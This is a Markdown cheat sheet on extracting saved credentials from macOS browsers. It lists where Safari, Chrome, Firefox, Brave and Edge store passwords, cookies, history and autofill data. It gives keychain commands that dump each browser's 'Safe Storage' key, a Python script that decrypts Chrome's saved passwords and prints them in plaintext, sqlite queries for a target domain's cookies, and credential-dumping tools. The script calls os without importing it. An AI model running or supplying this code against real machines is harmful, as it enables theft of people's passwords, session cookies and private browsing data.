# macOS Browser Credential Extraction

Locations and methods for extracting saved passwords, cookies, and tokens from macOS browsers.

---

## Browser Credential Locations

### Safari
```bash
# Safari stores passwords in the system keychain (not in a separate file)
# Cookies
~/Library/Cookies/Cookies.binarycookies

# History
~/Library/Safari/History.db

# Bookmarks
~/Library/Safari/Bookmarks.plist

# Form autofill
~/Library/Safari/Form\ Values

# Last session / tabs
~/Library/Safari/LastSession.plist

# Extensions
~/Library/Safari/Extensions/

# Passwords: stored in keychain, query with:
security find-internet-password -s "example.com" -w 2>/dev/null
```

### Google Chrome
```bash
# Login Data (SQLite — passwords encrypted with Keychain "Chrome Safe Storage" key)
~/Library/Application\ Support/Google/Chrome/Default/Login\ Data

# Cookies (SQLite — encrypted with same key)
~/Library/Application\ Support/Google/Chrome/Default/Cookies

# History
~/Library/Application\ Support/Google/Chrome/Default/History

# Bookmarks
~/Library/Application\ Support/Google/Chrome/Default/Bookmarks

# Web Data (autofill, credit cards)
~/Library/Application\ Support/Google/Chrome/Default/Web\ Data

# Local State (contains encrypted key reference)
~/Library/Application\ Support/Google/Chrome/Local\ State

# Extensions
~/Library/Application\ Support/Google/Chrome/Default/Extensions/

# To decrypt Chrome passwords:
# 1. Get the "Chrome Safe Storage" key from keychain
security find-generic-password -s "Chrome Safe Storage" -w 2>/dev/null
# 2. Use the key to decrypt AES-CBC encrypted passwords in Login Data SQLite
```

### Chrome Password Decryption (Python)
```python
import sqlite3, hashlib, binascii, subprocess
from Crypto.Cipher import AES

# Get Chrome Safe Storage key from keychain
key = subprocess.check_output([
    'security', 'find-generic-password',
    '-s', 'Chrome Safe Storage', '-w'
]).strip()

# Derive decryption key (PBKDF2)
derived = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003, dklen=16)

def decrypt_chrome_password(encrypted):
    if encrypted[:3] == b'v10':
        iv = b' ' * 16
        cipher = AES.new(derived, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(encrypted[3:])
        # Remove PKCS7 padding
        return decrypted[:-decrypted[-1]].decode('utf-8')
    return ''

# Read Login Data (copy first — Chrome locks the file)
import shutil
shutil.copy2(
    f'{os.path.expanduser("~")}/Library/Application Support/Google/Chrome/Default/Login Data',
    '/tmp/chrome_login_data'
)

conn = sqlite3.connect('/tmp/chrome_login_data')
for row in conn.execute('SELECT origin_url, username_value, password_value FROM logins'):
    url, user, enc_pass = row
    password = decrypt_chrome_password(enc_pass)
    if user:
        print(f'{url} | {user} | {password}')
```

### Firefox
```bash
# Logins (JSON — encrypted with key from key4.db)
~/Library/Application\ Support/Firefox/Profiles/*.default-release/logins.json

# Key database (contains the master key for decryption)
~/Library/Application\ Support/Firefox/Profiles/*.default-release/key4.db

# Cookies
~/Library/Application\ Support/Firefox/Profiles/*.default-release/cookies.sqlite

# History / bookmarks
~/Library/Application\ Support/Firefox/Profiles/*.default-release/places.sqlite

# Session
~/Library/Application\ Support/Firefox/Profiles/*.default-release/sessionstore-backups/

# To decrypt Firefox passwords, use:
# - firefox_decrypt (https://github.com/unode/firefox_decrypt)
# - firepwd.py (https://github.com/lclevy/firepwd)
python3 firefox_decrypt.py ~/Library/Application\ Support/Firefox/Profiles/*.default-release/
```

### Brave
```bash
# Same structure as Chrome (Chromium-based)
~/Library/Application\ Support/BraveSoftware/Brave-Browser/Default/Login\ Data
~/Library/Application\ Support/BraveSoftware/Brave-Browser/Default/Cookies

# Safe Storage key
security find-generic-password -s "Brave Safe Storage" -w 2>/dev/null
```

### Microsoft Edge
```bash
# Same structure as Chrome (Chromium-based)
~/Library/Application\ Support/Microsoft\ Edge/Default/Login\ Data
~/Library/Application\ Support/Microsoft\ Edge/Default/Cookies

# Safe Storage key
security find-generic-password -s "Microsoft Edge Safe Storage" -w 2>/dev/null
```

---

## Quick Extraction Commands

```bash
# List all Chrome saved sites (without passwords)
sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data \
    "SELECT origin_url, username_value FROM logins WHERE username_value != '';"

# List all Firefox saved sites
python3 -c "
import json, glob
for f in glob.glob('$HOME/Library/Application Support/Firefox/Profiles/*/logins.json'):
    data = json.load(open(f))
    for login in data.get('logins', []):
        print(f\"{login['hostname']} | {login.get('encryptedUsername','')}\")
"

# Chrome cookies for a specific domain
cp ~/Library/Application\ Support/Google/Chrome/Default/Cookies /tmp/chrome_cookies
sqlite3 /tmp/chrome_cookies "SELECT host_key, name, path FROM cookies WHERE host_key LIKE '%target.com%';"

# Safari history
sqlite3 ~/Library/Safari/History.db "SELECT url, visit_time FROM history_visits ORDER BY visit_time DESC LIMIT 20;"
```

---

## Tools

| Tool | Purpose |
|------|---------|
| [LaZagne](https://github.com/AlessandroZ/LaZagne) | Multi-browser credential extraction |
| [chainbreaker](https://github.com/n0fate/chainbreaker) | Offline keychain analysis |
| [firefox_decrypt](https://github.com/unode/firefox_decrypt) | Firefox password decryption |
| [chrome-passwords](https://github.com/nicehash/CefSharp) | Chrome password decryption |
| [keychaindump](https://github.com/juuso/keychaindump) | Keychain memory dump (legacy) |
